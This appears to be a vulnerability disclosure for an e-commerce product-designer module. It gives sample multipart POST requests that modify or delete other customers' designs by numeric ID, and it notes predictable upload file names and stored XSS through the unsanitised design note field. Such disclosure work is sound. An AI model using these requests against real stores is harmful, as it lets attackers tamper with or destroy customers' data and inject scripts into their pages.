## Modify files uploaded by other users

Uploaded file names are generally prefixed with the current UNIX timestamp, as returned by `time()`.
There is no attempt to randomize the prefix or to avoid collisions with other users uploading at the same time.

## Modify designs created by other users

### Request:
```
POST https://testing.local.tld/pdp/customerdesign/updateDesignDetails/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="id"

2
---------------------------acebdf13572468
Content-Disposition: form-data; name="note"

xyzzyx
---------------------------acebdf13572468--
```

### Response:
302 redirect.

Modifies the details of an existing customer design with given ID.

These design details are displayed to the customer who created it without proper sanitization,
which permits XSS and other fun attacks. 


## Delete designs created by other users

### Request:
```
POST https://testing.local.tld/pdp/customerdesign/delete/ HTTP/1.1
Content-Type: multipart/form-data; boundary=-------------------------acebdf13572468

---------------------------acebdf13572468
Content-Disposition: form-data; name="id"

2
---------------------------acebdf13572468--
```

### Response:
302 redirect.

Deletes the existing customer design with given ID from the database.
